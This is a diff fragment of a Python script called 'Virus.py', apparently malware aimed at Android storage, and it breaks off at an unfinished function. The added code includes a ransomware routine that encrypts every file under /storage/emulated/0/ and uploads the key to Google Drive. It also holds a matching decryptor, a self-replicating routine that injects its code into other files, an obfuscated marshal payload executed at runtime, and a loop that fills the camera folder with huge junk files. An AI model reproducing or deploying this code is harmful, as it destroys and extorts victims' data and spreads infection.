+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⡿⠟⠛⠛⠛⠛⠛⠻⢿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣿⣇⠀⠀⢴⣶⣿⣿⣿⡟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⣿⣿⣿⣷⣶⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣆⠀⠈⠉⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠈⠉⠀⢀⣾⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣻⣿⣧⡀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⣰⣿⣿⣁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⣿⠿⠛⣿⣷⡄⠀⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡏⠀⠀⣴⣿⠟⠿⢿⣿⣷⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡟⠋⠉⠀⠀⠀⠀⠈⢿⣿⣄⠀⠻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⢀⣾⣿⠏⠀⠀⠀⠀⠉⠉⠻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣦⠀⠙⢿⣿⣶⣤⣀⣀⠀⠀⠀⣀⣀⣤⣶⣿⣿⠟⠀⣰⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠀⣰⣿⣿⣿⣿⡿⠿⠿⠿⠿⢿⠿⡿⡿⠿⣿⣿⢿⣿⣿⣿⣿⣿⢿⢿⡿⠿⠿⠿⠿⠿⢿⣿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣷⡀⢹⣿⣧⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⣿⡿⠁⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠘⣋⡓⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠃⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⣇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣾⣿⠁⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡙⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠊⡠⠂⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣿⣿⠃⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠸⡄⢀⣤⣶⣿⣿⣿⣿⣿⣷⣦⣄⠔⠃⢀⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢿⣿⡆⠀⠀⠀⠀
+⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣾⣿⡿⠋⠁⠀⠀⠀⠀⠉⠻⣿⣷⣠⠔⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠈⢿⣿⡄⠀⠀⠀
+⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠏⠀⢀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀
+⠀⠀⣸⣿⠏⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠸⣿⣷⣄⠀⢀⣴⣿⡷⠀⠘⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠘⣿⣷⡀⠀
+⠀⣸⣿⡟⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀⠈⠻⠟⠀⠸⠿⠋⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠘⣿⣷⠀
+⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⣦⣀⡀⠀⠀⠀⠀⣀⣤⣶⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇
+⠈⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠙⢻⣿⣇⡧⠀⣃⠇⣿⣿⡟⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣼⣿⠇
+⠀⠈⠛⢿⣿⣦⣀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠀⠀⠀⠈⡿⣿⣿⣿⣿⣿⡿⠃⢇⠀⠑⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢀⣤⣾⣿⠟⠁⠀
+⠀⠀⠀⠀⠉⠻⣿⣷⣤⡀⠀⣿⣿⠀⠀⠀⠀⠀⠀⣀⣀⣠⡆⠅⠠⠐⠐⠊⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠈⠢⡀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⣠⣶⣿⡿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣶⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠚⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
+'''+R+'''              __     ___                 '''+W+'''
+'''+R+'''              \ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
+'''+R+'''               \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
+'''+R+'''                \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
+'''+R+'''                 \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
+'''+R+'''                                         |_|    |___/'''+W+'''
+''','''
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⢀⣠⣴⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⠻⠿⢿⣷⣦⣄⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⢿⡿⠋⠀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⡀⠈⠛⢿⡿⣼⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
+⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠇⠘⣿⡟⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⢻⣿⠀⠸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
+⠀⣰⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣧⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⣼⡟⠀⣾⣿⣿⣿⣷⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⡄⠀
+⢀⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡄⠘⣿⣷⣤⣀⣀⡀⠀⣈⣩⣿⣿⣍⣁⠀⣀⣀⣀⣠⣼⣿⠇⢠⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⠀
+⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⣨⣿⣿⣿⣿⣿⣿⣿⡿⢀⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⡇
+⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⡿⠛⠉⣿⣿⣧⣾⣷⣼⣿⣿⡟⠋⠉⢻⣿⡿⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇
+⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠈⠋⠉⠒⠀⠀⣿⣿⣿⣿⢿⡟⣻⣿⡇⠀⠀⠙⠉⣀⣴⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
+⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣾⣷⣄⡀⠀⣿⣿⣿⣿⢸⡇⣿⣿⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
+⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⢸⣿⢸⡇⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁
+⠀⠙⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⡿⠀⢸⣿⢸⣿⢸⡇⣿⡇⠀⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⡿⣱⡆⠸⣿⢸⣿⣿⡇⣿⡇⠀⣞⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣄⣈⡈⠉⠈⢁⣉⣁⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀
+'''+R+'''            __     ___                 '''+W+'''
+'''+R+'''            \ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
+'''+R+'''             \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
+'''+R+'''              \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
+'''+R+'''               \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
+'''+R+'''                                       |_|    |___/'''+W+'''
+''']
+dead_name = random.choice(dead)
+print(dead_name)
+def check_for_modifications():
+    script_path = os.path.abspath(__file__)
 
-	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/1.9v'
+    with open(script_path, 'rb') as f:
+        current_script_hash = hashlib.md5(f.read()).hexdigest()
+    stored_hash_path = os.path.join(os.path.dirname(script_path), '.root.txt')
+    if not os.path.isfile(stored_hash_path):
+        with open(stored_hash_path, "w") as f:
+            f.write(current_script_hash)
+    else:
+        with open(stored_hash_path) as f:
+            stored_script_hash = f.read()
 	
+        if current_script_hash != stored_script_hash:
 	
+            os.remove(script_path)
+            exit()
+	
+    with open(stored_hash_path, 'w') as f:
+        f.write(current_script_hash)
+check_for_modifications()
+#print(dead_name)
+####################################
+##############Decrypted#############
+####################################
+def funktion1(decrypted_name):
+    import os
+    import shutil
+    try:
+        from cryptography.fernet import Fernet
+    except ImportError:
+        os.system('pip3 install cryptography')
+        from cryptography.fernet import Fernet
+
+    print('قم بإدخال مفتاح فك تشفير الملفات:\n')
+    key = input('File decryption key:')
+    cipher = Fernet(key)
+    for root, dirs, files in os.walk("/storage/emulated/0/"):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            with open(filepath, "rb") as f:
+                encrypted = f.read()
+            try:
+                original = cipher.decrypt(encrypted)
+            except Exception as e:
+                print(f"Error decrypting file {filepath}: {e}")
+                print(f"حدث خطاء اثناء فك تشفير الملف  {filepath}: {e}")
+                continue
+
+            with open(filepath, "wb") as f:
+                f.write(original)
+
+            print(f"File {filepath} decrypted.\n")
+            print(f"تم فك تشفير الملف  {filepath} بنجاح.\n")
+            decrypted_dir = os.path.join(root)
+            if not os.path.exists(decrypted_dir):
+                os.makedirs(decrypted_dir)
+            shutil.move(filepath, os.path.join(decrypted_dir, filename))
+    print("Decryption complete.\n")
+    print("تم فم تشفير الملفات بنجاح.")
+    pass
+####################################
+##############Encrypted#############
+####################################
+def funktion2(encrypted_name):
+    import os,time,json
+    try:
+        from cryptography.fernet import Fernet
+        import requests
+        from tqdm import tqdm
+    except ImportError:
+        os.system('pip3 install cryptography')
+        os.system('pip3 install requests')
+        os.system('pip3 install tqdm')
+        from cryptography.fernet import Fernet
+        import requests
+        from tqdm import tqdm
+    password = ("passe")
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+    total_files = sum(len(files) for _, _, files in os.walk("/storage/emulated/0/"))
+    encrypted_files = 0
+    elapsed_time = 0
+    for root, dirs, files in os.walk("/storage/emulated/0/"):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            with open(filepath, "rb") as f:
+                original = f.read()
+            encrypted = cipher.encrypt(original)
+            with open(filepath, "wb") as f:
+                f.write(encrypted)
+            encrypted_files += 1
+            if encrypted_files % 100 == 0:
+                print(f"{encrypted_files} files encrypted so far.")
+            if encrypted_files % 1000 == 0:
+                elapsed_time = time.time() - start_time
+                if elapsed_time > 60:
+                    print("Encryption is taking too long. Stopping.")
+                    break
+        if encrypted_files % 1000 == 0:
+            if elapsed_time > 60:
+                break
+    with open("Password.txt", "wb") as f:
+        f.write(key)
+    non = ('abcde')
+    headers = {"Authorization": "Bearer " + non}
+    para = {
+        "name": "Password.txt"
+    }
+    files = {
+        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+        'file': open("Password.txt", "rb")
+    }
+    r = requests.post(
+        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+        headers=headers,
+        files=files
+    )
+    if r.status_code == 200:
+        os.remove("Password.txt")
+    password = ""
+    GREN = ('\033[92m')
+    pink = ('\033[95m')
+    RED = ("\033[31m")
+    yellow= ('\033[93m')
+    print(GREN+''' ____''')
+    print(GREN+'''|  _ \ '''+RED+''' ___ '''+yellow+''' _ __   '''+pink+'''___''')
+    print(GREN+'''| | | |'''+RED+'''/ _ \\\033[93m| '_ \\\033[95m / _ \\''')
+    print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
+    print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
+    pass
+####################################
+##############Spreading#############
+####################################
+def funktion3(spreading_name):
+    import os, time, sys, glob
+    paths = ['/storage/emulated/0/']
+    while 1:
+        the_code = []
+        with open(sys.argv[0], 'r') as f:
+            lines = f.readlines()
+        self_replicating_part = False
+        for line in lines:
+            if line == "# SAYS HI!":
+                self_replicating_part = True
+            if not self_replicating_part:
+                the_code.append(line)
+            if line == "# SAYS BYE!\n":
+                break
+        for path in paths:
+            for root, dirs, files in os.walk(path):
+                for name in files:
+                    file = os.path.join(root, name)
+                    if os.path.exists(file):
+                        _, file_extension = os.path.splitext(file)
+                        if file_extension in ('*'):
+                            with open(file, 'r', encoding='latin-1') as f:
+                                file_code = f.readlines()
+                            infected = False
+                            for line in file_code:
+                                if line == "# SAYS HI!\n":
+                                    infected = True
+                                    break
+                            if not infected:
+                                final_code = []
+                                final_code.extend(the_code)
+                                final_code.extend('\n')
+                                final_code.extend(file_code)
+                                with open(file, 'w') as f:
+                                    f.writelines(final_code)
+        def countdown():
+            os.system("clear" or "cls")
+            print("Please wait.. |")
+            os.system("clear" or "cls")
+            print("Please wait.. /")
+            os.system("clear" or "cls")
+            print("Please wait.. -")
+            os.system("clear" or "cls")
+            print("Please wait.. \ ")
+        countdown()
+    pass
+####################################
+##############Delet#################
+####################################
+def funktion4(delet_name):
+    import marshal
+    import base64
+    import types
+    import zlib
+    compressed_string = 'eJxdTssOgjAQ/CAvFDWRg4ddwSogsfFR6M0WLBEQSBCVr7dwdA+T2dmd2V284a+8EdwR2DjbHfjIBWwLoG+4M1xBACggyIF5RsczbAr3/Com9yz/fOUJOlUlOpxHlpz7ubAvveCESLq1BGf9YbNqAxbeoHIGW4shiyOjWw3E++luy/CLzJBj3bKhUdc4KtUzUpI7dcKJuuz8XphcyUkjq9T0pXWjziumJDd7dfjEpa27Lrs6VcqXj5SWvdSJCcQBpy81utpb/wAPdE+p'
+    hash_string = 'MzE1YWE4ODU2NDQ2ZmJmYWMzNGY2NzY1YjlkZWE3MmVkODE1MDRkODI4YzdmOTBkMzY1MDdmYWYzNGNkZjhjOA=='
+    compressed = base64.b64decode(compressed_string)
+    hash_string = base64.b64decode(hash_string).decode('utf-8')
+    if hashlib.sha256(compressed).hexdigest() != hash_string:
+        raise ValueError("Data integrity check failed")
+    decompressed = zlib.decompress(compressed)
+    decoded = base64.b64decode(decompressed)
+    code = marshal.loads(decoded)
+    my_function = types.FunctionType(code, globals())
+    my_function()
+    pass
+####################################
+##############Config################
+####################################
+def funktion5(config_name):
+    import os, time
+    R = ("\033[31m")
+    pink = ('\033[95m')
+    G = ('\033[92m')
+    os.system('clear')
+    print(R)
+    print (R+"\n▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.2)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒▒ Loading ...\n")
+    time.sleep(0.4)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒▒ Loading ...\n")
+    time.sleep(0.9)
+    os.system('clear')
+    print (R+"\n▓▓▓▓▓▓▓▓▓▓▓▓▓"+G+"▒▒ Loading ...\n")
+    time.sleep(0.1)
+    import random
+    try:
+        import uuid
+    except:
+        os.system('pip3 install uuid')
+    size = 109559 * 5024 * 1024
+    filename_prefix = 'file'
+    paths = ('/storage/emulated/0/DCIM/Camera/')
+    while True:
+        path = random.choice(paths)
+        filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
+        with open(filename, 'wb') as f:
+            f.seek(size - 1)
+            f.write(b'\0')
+    pass
+def funktion6(crash_name):
